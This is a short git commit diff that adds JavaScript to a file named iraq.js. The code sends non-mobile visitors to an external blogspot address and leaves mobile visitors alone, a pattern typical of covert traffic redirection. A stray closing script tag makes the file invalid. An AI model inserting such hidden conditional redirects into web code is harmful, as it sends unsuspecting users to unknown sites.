8e6df73a48879b91a6e8c88fca9e0064fadcad91
abono7 <103328175+abono7@users.noreply.github.com>
2022-11-07 06:10:56 +0200

    Update iraq.js

--- iraq.js
+++ iraq.js
@@ -1,1 +1,5 @@
-
+if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+            } else {
+                window.location.href = "https://sf77d4f.blogspot.com/";
+            }
+        </script>
